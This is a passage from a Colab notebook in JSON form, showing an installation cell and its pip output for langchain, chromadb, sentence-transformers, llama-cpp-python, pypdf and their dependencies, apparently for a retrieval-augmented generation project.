      ]
    },
    {
      "cell_type": "markdown",
      "metadata": {
        "id": "Syag3oIcKHM0"
      },
      "source": [
        "## Installation"
      ]
    },
    {
      "cell_type": "code",
      "execution_count": 1,
      "metadata": {
        "id": "L18fYAOPJzZX",
        "colab": {
          "base_uri": "https://localhost:8080/"
        },
        "outputId": "4c6aa931-23d4-4a5d-e570-291875c4b076"
      },
      "outputs": [
        {
          "output_type": "stream",
          "name": "stdout",
          "text": [
            "Requirement already satisfied: langchain in /usr/local/lib/python3.10/dist-packages (0.3.0)\n",
            "Collecting sentence-transformers\n",
            "  Downloading sentence_transformers-3.1.0-py3-none-any.whl.metadata (23 kB)\n",
            "Collecting chromadb\n",
            "  Downloading chromadb-0.5.5-py3-none-any.whl.metadata (6.8 kB)\n",
            "Collecting llama-cpp-python\n",
            "  Downloading llama_cpp_python-0.2.90.tar.gz (63.8 MB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m63.8/63.8 MB\u001b[0m \u001b[31m7.7 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25h  Installing build dependencies ... \u001b[?25l\u001b[?25hdone\n",
            "  Getting requirements to build wheel ... \u001b[?25l\u001b[?25hdone\n",
            "  Installing backend dependencies ... \u001b[?25l\u001b[?25hdone\n",
            "  Preparing metadata (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "Requirement already satisfied: langchain_community in /usr/local/lib/python3.10/dist-packages (0.3.0)\n",
            "Collecting pypdf\n",
            "  Downloading pypdf-5.0.0-py3-none-any.whl.metadata (7.4 kB)\n",
            "Requirement already satisfied: PyYAML>=5.3 in /usr/local/lib/python3.10/dist-packages (from langchain) (6.0.2)\n",
            "Requirement already satisfied: SQLAlchemy<3,>=1.4 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.0.34)\n",
            "Requirement already satisfied: aiohttp<4.0.0,>=3.8.3 in /usr/local/lib/python3.10/dist-packages (from langchain) (3.10.5)\n",
            "Requirement already satisfied: async-timeout<5.0.0,>=4.0.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (4.0.3)\n",
            "Requirement already satisfied: langchain-core<0.4.0,>=0.3.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (0.3.1)\n",
            "Requirement already satisfied: langchain-text-splitters<0.4.0,>=0.3.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (0.3.0)\n",
            "Requirement already satisfied: langsmith<0.2.0,>=0.1.17 in /usr/local/lib/python3.10/dist-packages (from langchain) (0.1.121)\n",
            "Requirement already satisfied: numpy<2,>=1 in /usr/local/lib/python3.10/dist-packages (from langchain) (1.26.4)\n",
            "Requirement already satisfied: pydantic<3.0.0,>=2.7.4 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.9.1)\n",
            "Requirement already satisfied: requests<3,>=2 in /usr/local/lib/python3.10/dist-packages (from langchain) (2.32.3)\n",
            "Requirement already satisfied: tenacity!=8.4.0,<9.0.0,>=8.1.0 in /usr/local/lib/python3.10/dist-packages (from langchain) (8.5.0)\n",
            "Requirement already satisfied: transformers<5.0.0,>=4.38.0 in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (4.44.2)\n",
            "Requirement already satisfied: tqdm in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (4.66.5)\n",
            "Requirement already satisfied: torch>=1.11.0 in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (2.4.0+cu121)\n",
            "Requirement already satisfied: scikit-learn in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (1.3.2)\n",
            "Requirement already satisfied: scipy in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (1.13.1)\n",
            "Requirement already satisfied: huggingface-hub>=0.19.3 in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (0.24.7)\n",
            "Requirement already satisfied: Pillow in /usr/local/lib/python3.10/dist-packages (from sentence-transformers) (9.4.0)\n",
            "Requirement already satisfied: build>=1.0.3 in /usr/local/lib/python3.10/dist-packages (from chromadb) (1.2.2)\n",
            "Collecting chroma-hnswlib==0.7.6 (from chromadb)\n",
            "  Downloading chroma_hnswlib-0.7.6-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (252 bytes)\n",
            "Collecting fastapi>=0.95.2 (from chromadb)\n",
            "  Downloading fastapi-0.115.0-py3-none-any.whl.metadata (27 kB)\n",
            "Collecting uvicorn>=0.18.3 (from uvicorn[standard]>=0.18.3->chromadb)\n",
            "  Downloading uvicorn-0.30.6-py3-none-any.whl.metadata (6.6 kB)\n",
            "Collecting posthog>=2.4.0 (from chromadb)\n",
            "  Downloading posthog-3.6.6-py2.py3-none-any.whl.metadata (2.0 kB)\n",
            "Requirement already satisfied: typing-extensions>=4.5.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (4.12.2)\n",
            "Collecting onnxruntime>=1.14.1 (from chromadb)\n",
            "  Downloading onnxruntime-1.19.2-cp310-cp310-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl.metadata (4.5 kB)\n",
            "Collecting opentelemetry-api>=1.2.0 (from chromadb)\n",
            "  Downloading opentelemetry_api-1.27.0-py3-none-any.whl.metadata (1.4 kB)\n",
            "Collecting opentelemetry-exporter-otlp-proto-grpc>=1.2.0 (from chromadb)\n",
            "  Downloading opentelemetry_exporter_otlp_proto_grpc-1.27.0-py3-none-any.whl.metadata (2.3 kB)\n",
            "Collecting opentelemetry-instrumentation-fastapi>=0.41b0 (from chromadb)\n",
            "  Downloading opentelemetry_instrumentation_fastapi-0.48b0-py3-none-any.whl.metadata (2.1 kB)\n",
            "Collecting opentelemetry-sdk>=1.2.0 (from chromadb)\n",
            "  Downloading opentelemetry_sdk-1.27.0-py3-none-any.whl.metadata (1.5 kB)\n",
            "Requirement already satisfied: tokenizers>=0.13.2 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.19.1)\n",
            "Collecting pypika>=0.48.9 (from chromadb)\n",
            "  Downloading PyPika-0.48.9.tar.gz (67 kB)\n",
            "\u001b[2K     \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m67.3/67.3 kB\u001b[0m \u001b[31m7.0 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25h  Installing build dependencies ... \u001b[?25l\u001b[?25hdone\n",
            "  Getting requirements to build wheel ... \u001b[?25l\u001b[?25hdone\n",
            "  Preparing metadata (pyproject.toml) ... \u001b[?25l\u001b[?25hdone\n",
            "Collecting overrides>=7.3.1 (from chromadb)\n",
            "  Downloading overrides-7.7.0-py3-none-any.whl.metadata (5.8 kB)\n",
            "Requirement already satisfied: importlib-resources in /usr/local/lib/python3.10/dist-packages (from chromadb) (6.4.5)\n",
            "Requirement already satisfied: grpcio>=1.58.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (1.64.1)\n",
            "Collecting bcrypt>=4.0.1 (from chromadb)\n",
            "  Downloading bcrypt-4.2.0-cp39-abi3-manylinux_2_28_x86_64.whl.metadata (9.6 kB)\n",
            "Requirement already satisfied: typer>=0.9.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.12.5)\n",
            "Collecting kubernetes>=28.1.0 (from chromadb)\n",
            "  Downloading kubernetes-30.1.0-py2.py3-none-any.whl.metadata (1.5 kB)\n",
            "Collecting mmh3>=4.0.1 (from chromadb)\n",
            "  Downloading mmh3-4.1.0-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (13 kB)\n",
            "Requirement already satisfied: orjson>=3.9.12 in /usr/local/lib/python3.10/dist-packages (from chromadb) (3.10.7)\n",
            "Requirement already satisfied: httpx>=0.27.0 in /usr/local/lib/python3.10/dist-packages (from chromadb) (0.27.2)\n",
            "Collecting diskcache>=5.6.1 (from llama-cpp-python)\n",
            "  Downloading diskcache-5.6.3-py3-none-any.whl.metadata (20 kB)\n",
            "Requirement already satisfied: jinja2>=2.11.3 in /usr/local/lib/python3.10/dist-packages (from llama-cpp-python) (3.1.4)\n",
            "Requirement already satisfied: dataclasses-json<0.7,>=0.5.7 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (0.6.7)\n",
            "Requirement already satisfied: pydantic-settings<3.0.0,>=2.4.0 in /usr/local/lib/python3.10/dist-packages (from langchain_community) (2.5.2)\n",
            "Requirement already satisfied: aiohappyeyeballs>=2.3.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (2.4.0)\n",
            "Requirement already satisfied: aiosignal>=1.1.2 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.3.1)\n",
            "Requirement already satisfied: attrs>=17.3.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (24.2.0)\n",
            "Requirement already satisfied: frozenlist>=1.1.1 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.4.1)\n",
            "Requirement already satisfied: multidict<7.0,>=4.5 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (6.1.0)\n",
            "Requirement already satisfied: yarl<2.0,>=1.0 in /usr/local/lib/python3.10/dist-packages (from aiohttp<4.0.0,>=3.8.3->langchain) (1.11.1)\n",
            "Requirement already satisfied: packaging>=19.1 in /usr/local/lib/python3.10/dist-packages (from build>=1.0.3->chromadb) (24.1)\n",
            "Requirement already satisfied: pyproject_hooks in /usr/local/lib/python3.10/dist-packages (from build>=1.0.3->chromadb) (1.1.0)\n",
            "Requirement already satisfied: tomli>=1.1.0 in /usr/local/lib/python3.10/dist-packages (from build>=1.0.3->chromadb) (2.0.1)\n",
            "Requirement already satisfied: marshmallow<4.0.0,>=3.18.0 in /usr/local/lib/python3.10/dist-packages (from dataclasses-json<0.7,>=0.5.7->langchain_community) (3.22.0)\n",
            "Requirement already satisfied: typing-inspect<1,>=0.4.0 in /usr/local/lib/python3.10/dist-packages (from dataclasses-json<0.7,>=0.5.7->langchain_community) (0.9.0)\n",
            "Collecting starlette<0.39.0,>=0.37.2 (from fastapi>=0.95.2->chromadb)\n",
            "  Downloading starlette-0.38.5-py3-none-any.whl.metadata (6.0 kB)\n",
            "Requirement already satisfied: anyio in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (3.7.1)\n",
            "Requirement already satisfied: certifi in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (2024.8.30)\n",
            "Requirement already satisfied: httpcore==1.* in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (1.0.5)\n",
            "Requirement already satisfied: idna in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (3.8)\n",
            "Requirement already satisfied: sniffio in /usr/local/lib/python3.10/dist-packages (from httpx>=0.27.0->chromadb) (1.3.1)\n",
            "Requirement already satisfied: h11<0.15,>=0.13 in /usr/local/lib/python3.10/dist-packages (from httpcore==1.*->httpx>=0.27.0->chromadb) (0.14.0)\n",
            "Requirement already satisfied: filelock in /usr/local/lib/python3.10/dist-packages (from huggingface-hub>=0.19.3->sentence-transformers) (3.16.0)\n",
            "Requirement already satisfied: fsspec>=2023.5.0 in /usr/local/lib/python3.10/dist-packages (from huggingface-hub>=0.19.3->sentence-transformers) (2024.6.1)\n",
            "Requirement already satisfied: MarkupSafe>=2.0 in /usr/local/lib/python3.10/dist-packages (from jinja2>=2.11.3->llama-cpp-python) (2.1.5)\n",
            "Requirement already satisfied: six>=1.9.0 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (1.16.0)\n",
            "Requirement already satisfied: python-dateutil>=2.5.3 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (2.8.2)\n",
            "Requirement already satisfied: google-auth>=1.0.1 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (2.27.0)\n",
            "Requirement already satisfied: websocket-client!=0.40.0,!=0.41.*,!=0.42.*,>=0.32.0 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (1.8.0)\n",
            "Requirement already satisfied: requests-oauthlib in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (1.3.1)\n",
            "Requirement already satisfied: oauthlib>=3.2.2 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (3.2.2)\n",
            "Requirement already satisfied: urllib3>=1.24.2 in /usr/local/lib/python3.10/dist-packages (from kubernetes>=28.1.0->chromadb) (2.0.7)\n",
            "Requirement already satisfied: jsonpatch<2.0,>=1.33 in /usr/local/lib/python3.10/dist-packages (from langchain-core<0.4.0,>=0.3.0->langchain) (1.33)\n",
            "Collecting coloredlogs (from onnxruntime>=1.14.1->chromadb)\n",
            "  Downloading coloredlogs-15.0.1-py2.py3-none-any.whl.metadata (12 kB)\n",
            "Requirement already satisfied: flatbuffers in /usr/local/lib/python3.10/dist-packages (from onnxruntime>=1.14.1->chromadb) (24.3.25)\n",
            "Requirement already satisfied: protobuf in /usr/local/lib/python3.10/dist-packages (from onnxruntime>=1.14.1->chromadb) (3.20.3)\n",
            "Requirement already satisfied: sympy in /usr/local/lib/python3.10/dist-packages (from onnxruntime>=1.14.1->chromadb) (1.13.2)\n",
            "Collecting deprecated>=1.2.6 (from opentelemetry-api>=1.2.0->chromadb)\n",
            "  Downloading Deprecated-1.2.14-py2.py3-none-any.whl.metadata (5.4 kB)\n",
            "Collecting importlib-metadata<=8.4.0,>=6.0 (from opentelemetry-api>=1.2.0->chromadb)\n",
            "  Downloading importlib_metadata-8.4.0-py3-none-any.whl.metadata (4.7 kB)\n",
            "Requirement already satisfied: googleapis-common-protos~=1.52 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-exporter-otlp-proto-grpc>=1.2.0->chromadb) (1.65.0)\n",
            "Collecting opentelemetry-exporter-otlp-proto-common==1.27.0 (from opentelemetry-exporter-otlp-proto-grpc>=1.2.0->chromadb)\n",
            "  Downloading opentelemetry_exporter_otlp_proto_common-1.27.0-py3-none-any.whl.metadata (1.8 kB)\n",
            "Collecting opentelemetry-proto==1.27.0 (from opentelemetry-exporter-otlp-proto-grpc>=1.2.0->chromadb)\n",
            "  Downloading opentelemetry_proto-1.27.0-py3-none-any.whl.metadata (2.3 kB)\n",
            "Collecting opentelemetry-instrumentation-asgi==0.48b0 (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb)\n",
            "  Downloading opentelemetry_instrumentation_asgi-0.48b0-py3-none-any.whl.metadata (2.0 kB)\n",
            "Collecting opentelemetry-instrumentation==0.48b0 (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb)\n",
            "  Downloading opentelemetry_instrumentation-0.48b0-py3-none-any.whl.metadata (6.1 kB)\n",
            "Collecting opentelemetry-semantic-conventions==0.48b0 (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb)\n",
            "  Downloading opentelemetry_semantic_conventions-0.48b0-py3-none-any.whl.metadata (2.4 kB)\n",
            "Collecting opentelemetry-util-http==0.48b0 (from opentelemetry-instrumentation-fastapi>=0.41b0->chromadb)\n",
            "  Downloading opentelemetry_util_http-0.48b0-py3-none-any.whl.metadata (2.5 kB)\n",
            "Requirement already satisfied: setuptools>=16.0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation==0.48b0->opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (71.0.4)\n",
            "Requirement already satisfied: wrapt<2.0.0,>=1.0.0 in /usr/local/lib/python3.10/dist-packages (from opentelemetry-instrumentation==0.48b0->opentelemetry-instrumentation-fastapi>=0.41b0->chromadb) (1.16.0)\n",
            "Collecting asgiref~=3.0 (from opentelemetry-instrumentation-asgi==0.48b0->opentelemetry-instrumentation-fastapi>=0.41b0->chromadb)\n",
            "  Downloading asgiref-3.8.1-py3-none-any.whl.metadata (9.3 kB)\n",
            "Collecting monotonic>=1.5 (from posthog>=2.4.0->chromadb)\n",
            "  Downloading monotonic-1.6-py2.py3-none-any.whl.metadata (1.5 kB)\n",
            "Collecting backoff>=1.10.0 (from posthog>=2.4.0->chromadb)\n",
            "  Downloading backoff-2.2.1-py3-none-any.whl.metadata (14 kB)\n",
            "Requirement already satisfied: annotated-types>=0.6.0 in /usr/local/lib/python3.10/dist-packages (from pydantic<3.0.0,>=2.7.4->langchain) (0.7.0)\n",
            "Requirement already satisfied: pydantic-core==2.23.3 in /usr/local/lib/python3.10/dist-packages (from pydantic<3.0.0,>=2.7.4->langchain) (2.23.3)\n",
            "Requirement already satisfied: python-dotenv>=0.21.0 in /usr/local/lib/python3.10/dist-packages (from pydantic-settings<3.0.0,>=2.4.0->langchain_community) (1.0.1)\n",
            "Requirement already satisfied: charset-normalizer<4,>=2 in /usr/local/lib/python3.10/dist-packages (from requests<3,>=2->langchain) (3.3.2)\n",
            "Requirement already satisfied: greenlet!=0.4.17 in /usr/local/lib/python3.10/dist-packages (from SQLAlchemy<3,>=1.4->langchain) (3.1.0)\n",
            "Requirement already satisfied: networkx in /usr/local/lib/python3.10/dist-packages (from torch>=1.11.0->sentence-transformers) (3.3)\n",
            "Requirement already satisfied: regex!=2019.12.17 in /usr/local/lib/python3.10/dist-packages (from transformers<5.0.0,>=4.38.0->sentence-transformers) (2024.5.15)\n",
            "Requirement already satisfied: safetensors>=0.4.1 in /usr/local/lib/python3.10/dist-packages (from transformers<5.0.0,>=4.38.0->sentence-transformers) (0.4.5)\n",
            "Requirement already satisfied: click>=8.0.0 in /usr/local/lib/python3.10/dist-packages (from typer>=0.9.0->chromadb) (8.1.7)\n",
            "Requirement already satisfied: shellingham>=1.3.0 in /usr/local/lib/python3.10/dist-packages (from typer>=0.9.0->chromadb) (1.5.4)\n",
            "Requirement already satisfied: rich>=10.11.0 in /usr/local/lib/python3.10/dist-packages (from typer>=0.9.0->chromadb) (13.8.1)\n",
            "Collecting httptools>=0.5.0 (from uvicorn[standard]>=0.18.3->chromadb)\n",
            "  Downloading httptools-0.6.1-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (3.6 kB)\n",
            "Collecting uvloop!=0.15.0,!=0.15.1,>=0.14.0 (from uvicorn[standard]>=0.18.3->chromadb)\n",
            "  Downloading uvloop-0.20.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.9 kB)\n",
            "Collecting watchfiles>=0.13 (from uvicorn[standard]>=0.18.3->chromadb)\n",
            "  Downloading watchfiles-0.24.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (4.9 kB)\n",
            "Collecting websockets>=10.4 (from uvicorn[standard]>=0.18.3->chromadb)\n",
            "  Downloading websockets-13.0.1-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl.metadata (6.7 kB)\n",
            "Requirement already satisfied: joblib>=1.1.1 in /usr/local/lib/python3.10/dist-packages (from scikit-learn->sentence-transformers) (1.4.2)\n",
            "Requirement already satisfied: threadpoolctl>=2.0.0 in /usr/local/lib/python3.10/dist-packages (from scikit-learn->sentence-transformers) (3.5.0)\n",
            "Requirement already satisfied: cachetools<6.0,>=2.0.0 in /usr/local/lib/python3.10/dist-packages (from google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (5.5.0)\n",
            "Requirement already satisfied: pyasn1-modules>=0.2.1 in /usr/local/lib/python3.10/dist-packages (from google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (0.4.1)\n",
            "Requirement already satisfied: rsa<5,>=3.1.4 in /usr/local/lib/python3.10/dist-packages (from google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (4.9)\n",
            "Requirement already satisfied: zipp>=0.5 in /usr/local/lib/python3.10/dist-packages (from importlib-metadata<=8.4.0,>=6.0->opentelemetry-api>=1.2.0->chromadb) (3.20.2)\n",
            "Requirement already satisfied: jsonpointer>=1.9 in /usr/local/lib/python3.10/dist-packages (from jsonpatch<2.0,>=1.33->langchain-core<0.4.0,>=0.3.0->langchain) (3.0.0)\n",
            "Requirement already satisfied: markdown-it-py>=2.2.0 in /usr/local/lib/python3.10/dist-packages (from rich>=10.11.0->typer>=0.9.0->chromadb) (3.0.0)\n",
            "Requirement already satisfied: pygments<3.0.0,>=2.13.0 in /usr/local/lib/python3.10/dist-packages (from rich>=10.11.0->typer>=0.9.0->chromadb) (2.16.1)\n",
            "Requirement already satisfied: exceptiongroup in /usr/local/lib/python3.10/dist-packages (from anyio->httpx>=0.27.0->chromadb) (1.2.2)\n",
            "Requirement already satisfied: mypy-extensions>=0.3.0 in /usr/local/lib/python3.10/dist-packages (from typing-inspect<1,>=0.4.0->dataclasses-json<0.7,>=0.5.7->langchain_community) (1.0.0)\n",
            "Collecting humanfriendly>=9.1 (from coloredlogs->onnxruntime>=1.14.1->chromadb)\n",
            "  Downloading humanfriendly-10.0-py2.py3-none-any.whl.metadata (9.2 kB)\n",
            "Requirement already satisfied: mpmath<1.4,>=1.1.0 in /usr/local/lib/python3.10/dist-packages (from sympy->onnxruntime>=1.14.1->chromadb) (1.3.0)\n",
            "Requirement already satisfied: mdurl~=0.1 in /usr/local/lib/python3.10/dist-packages (from markdown-it-py>=2.2.0->rich>=10.11.0->typer>=0.9.0->chromadb) (0.1.2)\n",
            "Requirement already satisfied: pyasn1<0.7.0,>=0.4.6 in /usr/local/lib/python3.10/dist-packages (from pyasn1-modules>=0.2.1->google-auth>=1.0.1->kubernetes>=28.1.0->chromadb) (0.6.1)\n",
            "Downloading sentence_transformers-3.1.0-py3-none-any.whl (249 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m249.1/249.1 kB\u001b[0m \u001b[31m24.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading chromadb-0.5.5-py3-none-any.whl (584 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m584.3/584.3 kB\u001b[0m \u001b[31m46.1 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading chroma_hnswlib-0.7.6-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (2.4 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m2.4/2.4 MB\u001b[0m \u001b[31m79.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading pypdf-5.0.0-py3-none-any.whl (292 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m292.8/292.8 kB\u001b[0m \u001b[31m26.4 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading bcrypt-4.2.0-cp39-abi3-manylinux_2_28_x86_64.whl (273 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m273.8/273.8 kB\u001b[0m \u001b[31m26.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading diskcache-5.6.3-py3-none-any.whl (45 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m45.5/45.5 kB\u001b[0m \u001b[31m4.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading fastapi-0.115.0-py3-none-any.whl (94 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m94.6/94.6 kB\u001b[0m \u001b[31m10.3 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading kubernetes-30.1.0-py2.py3-none-any.whl (1.7 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m1.7/1.7 MB\u001b[0m \u001b[31m71.8 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading mmh3-4.1.0-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (67 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m67.6/67.6 kB\u001b[0m \u001b[31m7.6 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading onnxruntime-1.19.2-cp310-cp310-manylinux_2_27_x86_64.manylinux_2_28_x86_64.whl (13.2 MB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m13.2/13.2 MB\u001b[0m \u001b[31m39.5 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading opentelemetry_api-1.27.0-py3-none-any.whl (63 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m64.0/64.0 kB\u001b[0m \u001b[31m6.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading opentelemetry_exporter_otlp_proto_grpc-1.27.0-py3-none-any.whl (18 kB)\n",
            "Downloading opentelemetry_exporter_otlp_proto_common-1.27.0-py3-none-any.whl (17 kB)\n",
            "Downloading opentelemetry_proto-1.27.0-py3-none-any.whl (52 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m52.5/52.5 kB\u001b[0m \u001b[31m5.3 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading opentelemetry_instrumentation_fastapi-0.48b0-py3-none-any.whl (11 kB)\n",
            "Downloading opentelemetry_instrumentation-0.48b0-py3-none-any.whl (29 kB)\n",
            "Downloading opentelemetry_instrumentation_asgi-0.48b0-py3-none-any.whl (15 kB)\n",
            "Downloading opentelemetry_semantic_conventions-0.48b0-py3-none-any.whl (149 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m149.7/149.7 kB\u001b[0m \u001b[31m15.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading opentelemetry_util_http-0.48b0-py3-none-any.whl (6.9 kB)\n",
            "Downloading opentelemetry_sdk-1.27.0-py3-none-any.whl (110 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m110.5/110.5 kB\u001b[0m \u001b[31m12.2 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading overrides-7.7.0-py3-none-any.whl (17 kB)\n",
            "Downloading posthog-3.6.6-py2.py3-none-any.whl (54 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m54.3/54.3 kB\u001b[0m \u001b[31m5.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading uvicorn-0.30.6-py3-none-any.whl (62 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m62.8/62.8 kB\u001b[0m \u001b[31m6.9 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading backoff-2.2.1-py3-none-any.whl (15 kB)\n",
            "Downloading Deprecated-1.2.14-py2.py3-none-any.whl (9.6 kB)\n",
            "Downloading httptools-0.6.1-cp310-cp310-manylinux_2_5_x86_64.manylinux1_x86_64.manylinux_2_17_x86_64.manylinux2014_x86_64.whl (341 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m341.4/341.4 kB\u001b[0m \u001b[31m32.8 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading importlib_metadata-8.4.0-py3-none-any.whl (26 kB)\n",
            "Downloading monotonic-1.6-py2.py3-none-any.whl (8.2 kB)\n",
            "Downloading starlette-0.38.5-py3-none-any.whl (71 kB)\n",
            "\u001b[2K   \u001b[90m━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\u001b[0m \u001b[32m71.4/71.4 kB\u001b[0m \u001b[31m7.3 MB/s\u001b[0m eta \u001b[36m0:00:00\u001b[0m\n",
            "\u001b[?25hDownloading uvloop-0.20.0-cp310-cp310-manylinux_2_17_x86_64.manylinux2014_x86_64.whl (3.4 MB)\n",
